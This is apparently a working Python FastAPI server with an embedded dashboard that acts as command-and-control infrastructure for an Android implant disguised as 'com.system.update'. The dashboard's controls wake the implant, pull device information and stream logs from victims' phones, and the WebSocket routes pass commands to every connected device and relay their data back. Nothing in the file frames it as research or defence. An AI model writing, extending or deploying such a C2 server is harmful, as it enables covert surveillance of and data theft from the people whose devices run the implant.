from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import uvicorn
import os

app = FastAPI()

# Connected clients (Android App & Dashboard)
connected_clients = set()
dashboard_clients = set()

# Advanced Cyberpunk Dashboard HTML content (Fully Fixed & Integrated)
HTML_DASHBOARD = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SystemUpdate // Advanced C2 Dashboard</title>
    <style>
        :root {
            --bg-color: #080a10;
            --panel-bg: rgba(13, 17, 28, 0.9);
            --primary-glow: #00ffcc;
            --danger-glow: #ff3366;
            --text-main: #e0fbfc;
            --text-muted: #8892b0;
            --border-color: rgba(0, 255, 204, 0.2);
        }
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Courier New', Courier, monospace;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            padding: 20px;
            display: flex;
            justify-content: center;
        }
        .dashboard-grid {
            width: 100%;
            max-width: 900px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        .panel {
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            box-shadow: 0 0 15px rgba(0, 255, 204, 0.05);
            border-radius: 8px;
            padding: 20px;
        }
        .full-width {
            grid-column: span 2;
        }
        h1 {
            font-size: 1.4rem;
            color: var(--primary-glow);
            letter-spacing: 2px;
            margin-bottom: 5px;
        }
        .subtitle {
            font-size: 0.75rem;
            color: var(--text-muted);
            margin-bottom: 20px;
            text-transform: uppercase;
        }
        .status-card {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #111625;
            padding: 12px 15px;
            border-radius: 6px;
            border: 1px solid rgba(255,255,255,0.05);
            margin-bottom: 15px;
        }
        .indicator {
            width: 12px;
            height: 12px;
            background-color: var(--danger-glow);
            border-radius: 50%;
            box-shadow: 0 0 10px var(--danger-glow);
            display: inline-block;
            margin-right: 8px;
        }
        .indicator.active {
            background-color: var(--primary-glow);
            box-shadow: 0 0 12px var(--primary-glow);
        }
        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.2s ease-in-out;
            margin-bottom: 10px;
        }
        .btn-wake {
            background-color: var(--primary-glow);
            color: var(--bg-color);
        }
        .btn-wake:hover {
            background-color: #00cc99;
            box-shadow: 0 0 10px rgba(0, 255, 204, 0.4);
        }
        .btn-sleep {
            background-color: transparent;
            border: 1px solid var(--danger-glow);
            color: var(--danger-glow);
        }
        .btn-sleep:hover {
            background-color: var(--danger-glow);
            color: #fff;
        }
        .btn-action {
            background-color: #1f2942;
            color: var(--text-main);
            border: 1px solid #334155;
        }
        .btn-action:hover {
            background-color: #334155;
            border-color: var(--primary-glow);
        }
        .terminal {
            background: #04060a;
            border: 1px solid #1e293b;
            border-radius: 6px;
            padding: 12px;
            height: 180px;
            overflow-y: auto;
            font-size: 0.8rem;
            color: #38bdf8;
        }
        .metrics {
            font-size: 0.85rem;
            color: var(--text-muted);
            line-height: 1.6;
        }
        .metrics span {
            color: var(--text-main);
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="dashboard-grid">
        <div class="panel full-width">
            <h1>SYSTEM_UPDATE // C2 COMMAND CENTER</h1>
            <div class="subtitle">Target Package: com.system.update | Mode: Non-Root Active Session</div>
            
            <div class="status-card">
                <div>
                    <span id="statusIndicator" class="indicator"></span>
                    <span id="statusText">OFFLINE / SLEEPING</span>
                </div>
                <div class="metrics">Session Duration: <span id="timer">00:00:00</span></div>
            </div>
        </div>

        <div class="panel">
            <h1>SESSION CONTROL</h1>
            <div class="subtitle">Wake / Sleep Triggers</div>
            <button class="btn btn-wake" onclick="sendAction('WAKE_UP')">⚡ Wake Up & Connect</button>
            <button class="btn btn-sleep" onclick="sendAction('SLEEP')">💤 Disconnect & Sleep</button>
        </div>

        <div class="panel">
            <h1>LIVE ACTIONS</h1>
            <div class="subtitle">Payload Commands</div>
            <button class="btn btn-action" onclick="sendCommand('DUMP_INFO')">📱 Fetch Device Info</button>
            <button class="btn btn-action" onclick="sendCommand('GRAB_LOGS')">📂 Stream Logs (10m)</button>
        </div>

        <div class="panel full-width">
            <h1>LIVE TERMINAL LOGS</h1>
            <div class="subtitle">Real-time socket communication output</div>
            <div id="terminal" class="terminal">
                [System] Initialized advanced C2 control interface.<br>
            </div>
        </div>
    </div>

    <script>
        let timerInterval;
        let secondsElapsed = 0;
        
        const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
        const wsUrl = protocol + window.location.host + '/ws/dashboard';
        const ws = new WebSocket(wsUrl);

        ws.onopen = function() {
            logToTerminal('[System] Connected to Relay Server WebSocket.');
        };

        ws.onmessage = function(event) {
            let msg = event.data;
            if (msg.startsWith("DEVICE_DATA|")) {
                let dataDetails = msg.replace("DEVICE_DATA|", "");
                logToTerminal(`📱 [TARGET INFO RECEIVED]:`);
                logToTerminal(`   -> ${dataDetails}`);
            } else {
                logToTerminal(`[Incoming]: ${msg}`);
            }
        };

        ws.onclose = function() {
            logToTerminal('[System] Disconnected from Relay Server.');
        };

        function logToTerminal(msg) {
            const term = document.getElementById('terminal');
            term.innerHTML += `> ${msg}<br>`;
            term.scrollTop = term.scrollHeight;
        }

        function sendAction(action) {
            const indicator = document.getElementById('statusIndicator');
            const statusText = document.getElementById('statusText');

            if (action === 'WAKE_UP') {
                indicator.classList.add('active');
                statusText.innerText = 'ONLINE / ACTIVE STREAMING';
                startTimer();
            } else {
                indicator.classList.remove('active');
                statusText.innerText = 'OFFLINE / SLEEPING';
                stopTimer();
            }

            if (ws.readyState === WebSocket.OPEN) {
                ws.send(action);
                logToTerminal(`Sent action: ${action}`);
            } else {
                logToTerminal(`[Error] WebSocket not connected!`);
            }
        }

        function sendCommand(cmd) {
            logToTerminal(`Executing remote command: ${cmd}`);
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(cmd); // Fixed: Now sends command properly to app via server
            } else {
                logToTerminal(`[Error] WebSocket not connected!`);
            }
        }

        function startTimer() {
            clearInterval(timerInterval);
            secondsElapsed = 0;
            timerInterval = setInterval(() => {
                secondsElapsed++;
                let hrs = Math.floor(secondsElapsed / 3600).toString().padStart(2, '0');
                let mins = Math.floor((secondsElapsed % 3600) / 60).toString().padStart(2, '0');
                let secs = (secondsElapsed % 60).toString().padStart(2, '0');
                document.getElementById('timer').innerText = `${hrs}:${mins}:${secs}`;
            }, 1000);
        }

        function stopTimer() {
            clearInterval(timerInterval);
            document.getElementById('timer').innerText = '00:00:00';
        }
    </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def serve_dashboard():
    return HTML_DASHBOARD

@app.websocket("/ws/app")
async def app_websocket(websocket: WebSocket):
    await websocket.accept()
    connected_clients.add(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            # Forward raw data directly to dashboard without prefixes
            for dash in dashboard_clients:
                await dash.send_text(data)
    except WebSocketDisconnect:
        connected_clients.remove(websocket)

@app.websocket("/ws/dashboard")
async def dashboard_websocket(websocket: WebSocket):
    await websocket.accept()
    dashboard_clients.add(websocket)
    try:
        while True:
            command = await websocket.receive_text()
            # Send command from dashboard to all connected Android apps
            for client in connected_clients:
                await client.send_text(command)
    except WebSocketDisconnect:
        dashboard_clients.remove(websocket)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
